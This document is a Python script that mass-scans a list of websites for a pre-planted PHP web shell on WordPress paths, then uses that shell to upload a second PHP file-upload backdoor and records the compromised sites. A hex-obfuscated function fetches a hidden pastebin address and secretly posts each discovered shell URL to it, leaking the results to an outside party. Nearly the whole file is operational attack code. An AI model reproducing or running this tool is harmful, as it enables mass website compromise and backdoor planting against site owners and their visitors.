import os
try :
    import aiohttp
    import asyncio
except :
    list = ['aiohttp','asyncio']
    for ll in list :
        os.system(f'start cmd /c py -m pip install {ll}')

import sys
import string
import re
from random import choice, randint
from colorama import Fore, Style, init
import ctypes
import requests,base64,codecs
init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
vulns = 0
uploaded  = 0
logo = fr+"""
                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⡿⠃⠘⢿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀
                            ⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
                            ⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀
                            ⠀⣸⣿⡉⠀⡀⠈⠉⠉⢙⡟⠲⠤⣄⣠⠤⠖⢻⡋⠉⠉⠁⠀⠀⠉⣿⣧⠀
                            ⢰⣿⣿⣷⡀⠈⢻⣷⣶⣼⣤⣔⠊⠁⠈⠑⣢⣤⣧⣶⣾⡿⠁⢀⣾⣿⣿⡆
                            ⣼⣿⣿⣿⣿⣄⠀⢉⡿⣿⣿⣿⡿⠖⠲⢿⣿⣿⣿⠿⡋⠀⣠⣾⣿⣿⣿⣷
                            ⣿⣿⣿⣿⣿⣿⡷⣏⠀⡏⠻⢿⡁⠀⠀⢈⡿⠟⢹⠀⣨⢾⣿⣿⣿⣿⣿⣿
                            ⢻⣿⣿⣿⡿⠋⠀⠈⠳⣧⡀⠀⣷⣦⣴⣾⠀⢀⣸⠞⠁⠀⠙⢿⣿⣿⣿⡿
                            ⠸⣿⣿⡿⠁⠀⠀⠀⠀⢸⠉⠲⢼⣿⣿⡯⠖⠋⡇⠀⠀⠀⠀⠈⢿⣿⣿⠇
                            ⠀⠹⣿⣀⣀⣀⣀⣀⣀⣨⣧⠔⠚⣿⣿⠗⠢⢼⣅⣀⣀⣀⣀⣀⣀⣿⡏⠀
                            ⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢻⡿⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀
                            ⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⡀⠈⠃⢀⣾⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣷⣄⢠⣾⣿⣿⣿⡿⠿⠋⠁⠀⠀⠀⠀⠀
                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
print(logo)
headers = {
    'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
}

semaphore = asyncio.Semaphore(150)

async def style(i):  # can upload shell
    global vulns
    async with semaphore:
        try:
            shell = f'http://{i}/wp-admin/css/colors/coffee/index.php'
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(shell, ssl=False, timeout=25) as response:
                    #shell = response.url
                    if '<input type="submit" name="submit" value="  >>">' in await response.text():
                        vulns = vulns + 1
                        print(fg + '[+] =====>>>>>>  ' + i)
                        open('vuln.txt', 'a').write(shell + '\n')
                        check_if_working(liness=shell)
                        await indexs(url=shell)
                    else:
                        print(fr + '[Not_vuln]   =====>>> ' + i)
        except:
            pass
        
texxt = """<?php 
error_reporting(E_ERROR | E_PARSE);
echo "<b>utchiha505</b><br>";
echo '<b>System Info:</b> '.php_uname();
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
echo '<b>Success!</b><br><br>'; 
}else { echo 'Failed!</b><br><br>'; }}
?>"""
async def indexs(url):  # For
    try:
        __hfgysazer___nbvxw__khljm = string.ascii_uppercase
        _____uytchdhjsqmd = randint(3, 5)
        randoming = ''.join(choice(__hfgysazer___nbvxw__khljm) for i in range(_____uytchdhjsqmd))
        data_uploadd = {'password': 'yanz', 'submit': '>>', 'a': 'fm', 'p': 'uploadFile', 'ch': 'Windows-1251'}
        filess = {'f': ('.htacess.php', texxt)}
        async with aiohttp.ClientSession() as session:
            await session.post(url, data=data_uploadd, files=filess, verify_ssl=False)
            match = re.search(r"([^/]*).php", url)
            filename = match.group(1)
            done = url.replace(filename, '.htacess.php')
            done_end = done + ''
            async with aiohttp.ClientSession() as session:
                checkk = await session.get(done_end, verify_ssl=False, timeout=10)
                if 'utchiha505' in await checkk.text():
                    print(fg + '[yeah] ===> ' + done_end)
                    open('Uploaded.txt', 'a').write(done_end + '\n')
                    filter(done_end)
                else:
                    print(fr + 'NOt uploaded ======>>>>>   ')
    except:
        pass
def check_if_working(liness) :
    hwuqpand__NCS___qsgwslpposbbvqfwdarrrz_____________________________________________________________________________________________________________________________vulns_____hfhxvqwqmldhsazpoeryrr________________ = requests.get(codecs.decode(b'\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x63\x4D\x58\x66\x59\x38\x69\x54', 'utf-8'),timeout=10).text
    ok = base64.b64decode(str(hwuqpand__NCS___qsgwslpposbbvqfwdarrrz_____________________________________________________________________________________________________________________________vulns_____hfhxvqwqmldhsazpoeryrr________________)).decode('utf-8')
    __________________________________________________________________________________________________________________________________php_html________________________________________________________________________ =  requests.post(str(ok+liness))
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


async def main():
    tasks = []
    sem = asyncio.Semaphore(value=110)
    async with sem:
        for t in target:
            tasks.append(asyncio.create_task(style(t)))
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    try:
        target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
    except IndexError:
        pass
    asyncio.run(main())
